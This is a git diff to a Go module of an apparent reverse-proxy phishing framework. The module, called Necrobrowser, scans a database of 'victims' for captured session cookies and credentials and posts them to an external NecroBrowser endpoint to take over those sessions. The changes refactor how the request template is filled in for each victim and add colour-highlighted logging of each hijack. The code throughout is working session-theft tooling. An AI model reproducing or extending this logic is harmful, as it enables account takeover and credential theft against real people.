@@ -6,8 +6,7 @@ import (
 	"strings"
 	"time"
 
-	"github.com/muraenateam/muraena/log"
-
+	"github.com/evilsocket/islazy/tui"
 	"gopkg.in/resty.v1"
 
 	"github.com/muraenateam/muraena/core/db"
@@ -38,7 +37,7 @@ type Necrobrowser struct {
 	Endpoint string
 	Profile  string
 
-	Request string
+	RequestTemplate string
 }
 
 // Cookies
@@ -104,19 +103,21 @@ func Load(s *session.Session) (m *Necrobrowser, err error) {
 		return
 	}
 
-	m.Request = string(bytes)
+	m.RequestTemplate = string(bytes)
 
 	// spawn a go routine that checks all the victims cookie jars every N seconds
 	// to see if we have any sessions ready to be instrumented
 	if s.Config.NecroBrowser.Enabled {
+		m.Info("enabled")
 		go m.CheckSessions()
+
+		m.Info("trigger delay every %d seconds", s.Config.NecroBrowser.Trigger.Delay)
 	}
 
 	return
 }
 
 func (module *Necrobrowser) CheckSessions() {
-
 	triggerType := module.Session.Config.NecroBrowser.Trigger.Type
 	triggerDelay := module.Session.Config.NecroBrowser.Trigger.Delay
 
@@ -125,12 +126,11 @@ func (module *Necrobrowser) CheckSessions() {
 		case "cookies":
 			module.CheckSessionCookies()
 		case "path":
-			// TODO
-			log.Warning("currently unsupported. TODO implement path")
 		default:
-			log.Warning("unsupported trigger type: %s", triggerType)
+			module.Debug("use authSessionResponse as trigger")
 		}
 
+		module.Verbose("sleeping for %d seconds", triggerDelay)
 		time.Sleep(time.Duration(triggerDelay) * time.Second)
 	}
 }
@@ -142,8 +142,6 @@ func (module *Necrobrowser) CheckSessionCookies() {
 	if err != nil {
 		module.Debug("error fetching all victims: %s", err)
 	}
-
-	// module.Debug("checkSessions: we have %d victim sessions. Checking authenticated ones.. ", len(victims))
 
 	for _, v := range victims {
 		cookiesFound := 0
@@ -177,6 +175,7 @@ func (module *Necrobrowser) CheckSessionCookies() {
 				module.Debug("error marshalling %s", err)
 			}
 
+			module.Info("instrumenting %s using %d cookies", tui.Bold(tui.Red(v.ID)), tui.Bold(tui.Red(string(rune(cookiesFound)))))
 			module.Instrument(v.ID, v.Cookies, string(j))
 
 			// prevent the session to be instrumented twice
@@ -195,13 +194,10 @@ func Contains(slice *[]string, find string) bool {
 }
 
 func (module *Necrobrowser) Instrument(victimID string, cookieJar []db.VictimCookie, credentialsJSON string) {
-
 	var necroCookies []SessionCookie
 	const timeLayout = "2006-01-02 15:04:05 -0700 MST"
 
 	for _, c := range cookieJar {
-
-		module.Debug("trying to parse  %s  with layout  %s", c.Expires, timeLayout)
 		t, err := time.Parse(timeLayout, c.Expires)
 		if err != nil {
 			module.Warning("warning: cant's parse Expires field (%s) of cookie %s. skipping cookie", c.Expires, c.Name)
@@ -228,23 +224,23 @@ func (module *Necrobrowser) Instrument(victimID string, cookieJar []db.VictimCoo
 		return
 	}
 
-	cookiesJSON := string(c)
-	module.Request = strings.ReplaceAll(module.Request, TrackerPlaceholder, victimID)
-	module.Request = strings.ReplaceAll(module.Request, CookiePlaceholder, cookiesJSON)
-	module.Request = strings.ReplaceAll(module.Request, CredentialsPlaceholder, credentialsJSON)
+	newRequest := module.RequestTemplate
+	newRequest = strings.ReplaceAll(newRequest, TrackerPlaceholder, victimID)
+	newRequest = strings.ReplaceAll(newRequest, CookiePlaceholder, string(c))
+	newRequest = strings.ReplaceAll(newRequest, CredentialsPlaceholder, credentialsJSON)
 
-	module.Debug(" Sending to NecroBrowser cookies:\n%v", cookiesJSON)
-
+	module.Info("instrumenting %s", tui.Bold(tui.Red(victimID)))
 	client := resty.New()
 	resp, err := client.R().
 		SetHeader("Content-Type", "application/json").
-		SetBody(module.Request).
+		SetBody(newRequest).
 		Post(module.Endpoint)
 
 	if err != nil {
+		module.Warning("Error sending request to NecroBrowser: %s", err)
 		return
 	}
 
-	module.Info("NecroBrowser Response: %+v", resp)
+	module.Info("instrumenting-response %s:\n%v", tui.Bold(tui.Red(victimID)), tui.Bold(tui.Green(resp.String())))
 	return
 }
